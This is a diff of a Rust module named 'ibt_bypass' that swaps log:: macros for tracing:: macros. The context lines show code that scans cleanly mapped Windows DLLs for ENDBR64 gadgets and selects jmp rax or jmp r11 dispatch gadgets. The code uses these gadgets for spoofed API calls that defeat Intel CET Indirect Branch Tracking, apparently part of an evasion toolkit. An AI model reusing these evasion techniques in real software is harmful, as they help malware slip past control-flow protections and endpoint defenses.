@@ -600,7 +600,7 @@ pub unsafe fn scan_module_for_endbr(
 
             // Early exit if we've collected enough gadgets.
             if gadgets.len() >= MAX_GADGETS_PER_MODULE {
-                log::debug!(
+                tracing::debug!(
                     "ibt_bypass: reached max gadgets ({}) for module at {:#x}",
                     MAX_GADGETS_PER_MODULE,
                     module_base,
@@ -612,7 +612,7 @@ pub unsafe fn scan_module_for_endbr(
         }
     }
 
-    log::info!(
+    tracing::info!(
         "ibt_bypass: found {} ENDBR64 gadgets in module at {:#x} (size {:#x})",
         gadgets.len(),
         module_base,
@@ -642,7 +642,7 @@ pub fn build_ibt_gadget_database() -> IbtResult<IbtGadgetDb> {
         let base = match crate::syscalls::map_clean_dll(dll_name) {
             Ok(b) => b,
             Err(e) => {
-                log::warn!(
+                tracing::warn!(
                     "ibt_bypass: could not map clean {}: {} — skipping",
                     dll_name,
                     e
@@ -661,7 +661,7 @@ pub fn build_ibt_gadget_database() -> IbtResult<IbtGadgetDb> {
         // Scan for ENDBR64 gadgets.
         let gadgets = unsafe { scan_module_for_endbr(base, size) }?;
 
-        log::info!(
+        tracing::info!(
             "ibt_bypass: scanned {} — {} ENDBR64 gadgets found",
             dll_name,
             gadgets.len(),
@@ -719,7 +719,7 @@ pub fn build_ibt_gadget_database() -> IbtResult<IbtGadgetDb> {
     }
 
     // Log database summary.
-    log::info!(
+    tracing::info!(
         "ibt_bypass: gadget database built — jmp_rax={} jmp_rcx={} jmp_rdx={} \
          jmp_r11={} call_rax={} ret={} syscall={} total={}",
         db.jmp_rax.len(),
@@ -755,13 +755,13 @@ pub fn init_ibt_bypass() -> bool {
     let cpu_supports = cpuid_ibt_supported();
 
     if !cpu_supports {
-        log::info!("ibt_bypass: CPU does not support CET IBT (CPUID.07H:EDX[20]=0)");
+        tracing::info!("ibt_bypass: CPU does not support CET IBT (CPUID.07H:EDX[20]=0)");
         IBT_AVAILABLE.store(false, Ordering::Release);
         IBT_INITIALIZED.store(true, Ordering::Release);
         return false;
     }
 
-    log::info!("ibt_bypass: CPU supports CET IBT (CPUID.07H:EDX[20]=1)");
+    tracing::info!("ibt_bypass: CPU supports CET IBT (CPUID.07H:EDX[20]=1)");
 
     // Build the gadget database.
     match build_ibt_gadget_database() {
@@ -770,14 +770,14 @@ pub fn init_ibt_bypass() -> bool {
             let usable = db.jmp_rax.len() + db.jmp_r11.len() + db.call_rax.len();
 
             if usable == 0 {
-                log::warn!(
+                tracing::warn!(
                     "ibt_bypass: {} ENDBR64 gadgets found but none are usable \
                      (need ENDBR64; jmp rax or ENDBR64; jmp r11)",
                     total,
                 );
                 IBT_AVAILABLE.store(false, Ordering::Release);
             } else {
-                log::info!(
+                tracing::info!(
                     "ibt_bypass: {} total gadgets, {} usable (jmp_rax={}, jmp_r11={}, call_rax={})",
                     total,
                     usable,
@@ -791,7 +791,7 @@ pub fn init_ibt_bypass() -> bool {
             let _ = GADGET_DB.set(db);
         }
         Err(e) => {
-            log::warn!("ibt_bypass: failed to build gadget database: {}", e);
+            tracing::warn!("ibt_bypass: failed to build gadget database: {}", e);
             IBT_AVAILABLE.store(false, Ordering::Release);
         }
     }
@@ -833,7 +833,7 @@ pub fn find_ibt_dispatch_gadget() -> Option<usize> {
 
     // Prefer ENDBR64; jmp rax — the cleanest dispatch.
     if let Some(g) = db.jmp_rax.first() {
-        log::trace!(
+        tracing::trace!(
             "ibt_bypass: using jmp_rax gadget at {:#x} ({})",
             g.addr,
             g.category,
@@ -843,7 +843,7 @@ pub fn find_ibt_dispatch_gadget() -> Option<usize> {
 
     // Fallback: ENDBR64; jmp r11 (spoof_call already uses R11 for API).
     if let Some(g) = db.jmp_r11.first() {
-        log::trace!(
+        tracing::trace!(
             "ibt_bypass: using jmp_r11 gadget at {:#x} ({})",
             g.addr,
             g.category,
@@ -853,7 +853,7 @@ pub fn find_ibt_dispatch_gadget() -> Option<usize> {
 
     // Fallback: ENDBR64; call rax (changes the shadow stack — less ideal).
     if let Some(g) = db.call_rax.first() {
-        log::trace!(
+        tracing::trace!(
             "ibt_bypass: using call_rax gadget at {:#x} ({})",
             g.addr,
             g.category,
@@ -861,7 +861,7 @@ pub fn find_ibt_dispatch_gadget() -> Option<usize> {
         return Some(g.addr);
     }
 
-    log::warn!("ibt_bypass: no suitable IBT dispatch gadget found");
+    tracing::warn!("ibt_bypass: no suitable IBT dispatch gadget found");
     None
 }
 
@@ -905,7 +905,7 @@ pub unsafe fn ibt_safe_spoof_call(
 ) -> IbtResult<u64> {
     let ibt_gadget = find_ibt_dispatch_gadget().ok_or(IbtError::NoGadgetsFound)?;
 
-    log::trace!(
+    tracing::trace!(
         "ibt_bypass: dispatching API call via IBT gadget at {:#x} → {:#x}",
         ibt_gadget,
         api_addr,
